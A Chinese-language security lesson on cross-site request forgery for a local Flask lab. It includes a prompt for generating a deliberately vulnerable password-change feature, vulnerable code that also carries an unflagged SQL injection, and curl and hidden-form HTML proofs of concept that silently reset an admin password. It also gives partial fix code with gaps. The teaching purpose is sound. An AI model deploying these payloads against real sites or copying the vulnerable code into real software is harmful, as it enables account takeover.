# Day 7 - CSRF 跨站请求伪造

## 一、页面部署提示词

> 学生将此提示词发给 Claude，即可生成带 CSRF 漏洞的功能：

```
在 Flask 中实现用户密码修改功能，要求：
1. 用户在个人中心可以修改自己的密码
2. 表单提交新密码即可，不需要输入原密码验证
3. 使用 Cookie/Session 识别用户身份
4. 不要添加额外的验证码或 Token，简化用户体验
5. 修改成功后直接跳转回个人中心
```

---

## 二、漏洞关键代码解释

### 漏洞：CSRF（跨站请求伪造）

```python
# core/password_manager.py
def change_password(username, new_password):
    """
    ============================================================
    VULN: CSRF 漏洞
    - 无 CSRF Token：请求中没有任何防跨站的 token 校验
    - 仅依赖 Cookie 自动携带：浏览器在跨站请求时自动带 Cookie
    - 无原密码验证：修改密码不需要确认旧密码
    ============================================================
    """
    # 更新内存存储
    from core.auth import USERS_DB
    if username in USERS_DB:
        USERS_DB[username]["password"] = new_password

    # 更新 SQLite 数据库
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute(f"UPDATE users SET password = '{new_password}' WHERE username = '{username}'")
    conn.commit()
    conn.close()
    return {"success": True, "message": "密码修改成功"}
```

**问题**：
1. **无 CSRF Token**：请求中没有随机 Token 来验证请求来源
2. **无原密码验证**：不需要旧密码即可修改
3. **Cookie 自动携带**：浏览器访问任何网站时都会自动带上目标站点的 Cookie
4. **GET/POST 均可**：路由同时支持 GET 和 POST

**攻击流程**：
```
1. 用户登录了 target.com → 浏览器有 target.com 的 Cookie
2. 用户访问攻击者的恶意网站 attacker.com
3. 恶意网站自动提交表单到 target.com/change-password
4. 浏览器自动附带 Cookie → 服务器认为是用户本人操作
5. 密码被修改 → 攻击者登录用户账号
```

---

## 三、漏洞成因总结

| 漏洞 | 根本原因 | 攻击条件 |
|------|---------|---------|
| 无 CSRF Token | 请求无唯一校验值 | 用户已登录 + 访问恶意页面 |
| 无原密码验证 | 直接修改密码 | 不需知道当前密码 |
| Cookie 自动携带 | 浏览器同源策略不限制写请求 | 跨站表单提交即可 |
| 单点验证 | 只验证了登录态，没验证操作意图 | 自动化脚本批量攻击 |

---

## 四、POC 代码

### POC 1：直接修改密码（无 Token 验证）

```bash
# 以 bob 身份登录
curl http://127.0.0.1:5000/login \
  -d "username=bob&password=bob666666" \
  -c /tmp/cookies_bob.txt

# 直接修改密码（不需要原密码、不需要 Token）
curl http://127.0.0.1:5000/change-password \
  -b /tmp/cookies_bob.txt \
  -d "username=bob&new_password=hacked123"

# 验证新密码可以登录
curl http://127.0.0.1:5000/login \
  -d "username=bob&password=hacked123" | grep "欢迎回来"
```

**预期结果**：无需原密码，仅凭 session cookie 即可修改密码。

### POC 2：跨站请求构造（CSRF PoC 页面）

创建一个 HTML 页面，用户访问后自动修改密码：

```html
<!DOCTYPE html>
<html>
<head><title>每日抽奖</title></head>
<body>
  <h1>恭喜你中奖了！</h1>
  <p>请稍候，正在为你准备奖品...</p>

  <!-- 隐藏表单：自动提交密码修改请求 -->
  <form action="http://127.0.0.1:5000/change-password"
        method="POST" id="csrf_form">
    <input type="hidden" name="username" value="admin">
    <input type="hidden" name="new_password" value="csrfd_pwned">
  </form>

  <script>
    // 页面加载后自动提交
    document.getElementById('csrf_form').submit();
  </script>
</body>
</html>
```

**测试方法**：
```bash
# 保存为 csrf_poc.html
# 管理员已登录 http://127.0.0.1:5000（浏览器有 Cookie）
# 管理员打开 csrf_poc.html
# → 密码被无声无息地修改为 csrfd_pwned
# → 攻击者用新密码登录
```

### POC 3：使用 Burp Suite 生成 CSRF PoC

1. 拦截正常密码修改请求
2. 右键 → Engagement tools → Generate CSRF PoC
3. Burp 自动生成 PoC HTML
4. 保存到文件，在浏览器中打开测试

---

## 五、POC 代码详细解释

### POC 1 详解

```bash
curl http://127.0.0.1:5000/change-password \
  -b /tmp/cookies_bob.txt \
  -d "username=bob&new_password=hacked123"
```

**为什么不需要原密码？**
```python
# 代码中没有任何地方比较旧密码
def change_password(username, new_password):
    # 没有 old_password 参数！
    # 没有验证 old_password 是否正确！
    # 直接更新数据库
    cursor.execute("UPDATE users SET password = ...")
```

**正常的安全流程应该是**：
```
1. 用户输入：旧密码 + 新密码
2. 服务器验证旧密码是否正确
3. 如果不正确 → 拒绝修改
4. 如果正确 → 更新为新密码
```

### POC 2 详解：跨站请求

```html
<form action="http://127.0.0.1:5000/change-password" method="POST">
  <input type="hidden" name="username" value="admin">
  <input type="hidden" name="new_password" value="csrfd_pwned">
</form>
<script>document.getElementById('csrf_form').submit();</script>
```

**攻击利用链条**：

```
用户 alice 的操作:
1. 浏览器打开 target.com → 输入密码登录
2. 浏览器获得 target.com 的 session Cookie
3. 继续浏览其他网站...

攻击者的操作:
1. 创建恶意网站，包含一个隐藏表单
2. 诱导 alice 访问恶意网站（通过钓鱼邮件、广告等）
3. alice 的浏览器加载恶意页面

恶意页面的行为:
1. <form action="http://target.com/change-password">
2. 浏览器检查: target.com? 我有它的 Cookie!
3. 浏览器自动附带 Cookie → 发送 POST 请求
4. 服务器收到请求 + Cookie → 认为 alice 本人在操作
5. 密码被修改 → 攻击者登录 alice 的账号
```

**为什么浏览器会发送 Cookie？**

Cookie 的同源策略：浏览器发送 Cookie 时检查的是**目标域名**，不检查**当前页面域名**。

```
当前页面: attacker.com/evil.html
表单提交到: target.com/change-password
                ↑
        浏览器: "目标域名是 target.com，我有它的 Cookie！附带发送！"
```

---

## 六、修复方案

```python
# fix/password_manager_fix.py
import secrets
import hashlib
import hmac

# 方案 1：添加 CSRF Token
class CSRFProtection:
    """CSRF Token 生成与验证"""

    @staticmethod
    def generate_token(session_id):
        """基于 session 生成唯一的 CSRF Token"""
        random_part = secrets.token_hex(16)
        return hashlib.sha256(f"{session_id}{random_part}".encode()).hexdigest()

    @staticmethod
    def verify_token(token, session_id, stored_token):
        """使用 hmac.compare_digest 安全比较 Token"""
        return hmac.compare_digest(token, stored_token)


def change_password_fixed(username, old_password, new_password, csrf_token, session_csrf_token):
    """修复：添加原密码验证 + CSRF Token 校验"""

    # 修复 1：CSRF Token 校验
    if not CSRFProtection.verify_token(csrf_token, username, session_csrf_token):
        return {"success": False, "message": "CSRF Token 无效"}

    # 修复 2：验证原密码
    from core.auth import USERS_DB
    if username in USERS_DB and USERS_DB[username]["password"] != old_password:
        return {"success": False, "message": "原密码错误"}

    # 修复 3：密码强度校验
    if len(new_password) < 8:
        return {"success": False, "message": "密码长度至少8位"}

    # 更新密码
    USERS_DB[username]["password"] = new_password
    return {"success": True, "message": "密码修改成功"}
```

**其他防御措施**：
```python
# 修复 4：SameSite Cookie（设置浏览器不自动发送 Cookie）
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'

# 修复 5：Referer 校验
def check_referer():
    referer = request.headers.get('Referer', '')
    if 'your-domain.com' not in referer:
        return False
    return True
```

---

## 七、课后作业

1. 在 `fix/` 目录创建 `password_manager_fix.py`，实现 CSRF Token 机制
2. 修改 `app.py`：
   - 在 `GET /profile` 时生成并传递 CSRF Token 到模板
   - 在 `POST /change-password` 时校验 Token
3. 验证：
   - 无 Token 的请求被拒绝
   - Token 错误被拒绝
   - 正常页面提交可正常修改
4. （进阶）尝试绕过 SameSite=Strict 的方法有哪些？

## 八、补充：SameSite 详解

| SameSite 值 | 跨站表单提交 | 跨站链接点击 | 同站请求 |
|-------------|------------|------------|---------|
| `None` | ✅ 发送 Cookie | ✅ 发送 Cookie | ✅ 发送 Cookie |
| `Lax`（默认） | ❌ 不发送 | ✅ 发送 | ✅ 发送 |
| `Strict` | ❌ 不发送 | ❌ 不发送 | ✅ 发送 |

**本漏洞未设置 SameSite，默认行为取决于浏览器**：
- Chrome 90+ 默认 `Lax` → POST 表单跨站不发送 Cookie，**但 GET 请求可触发**
- 如果路由同时接受 GET 请求，SameSite=Lax 可以被绕过
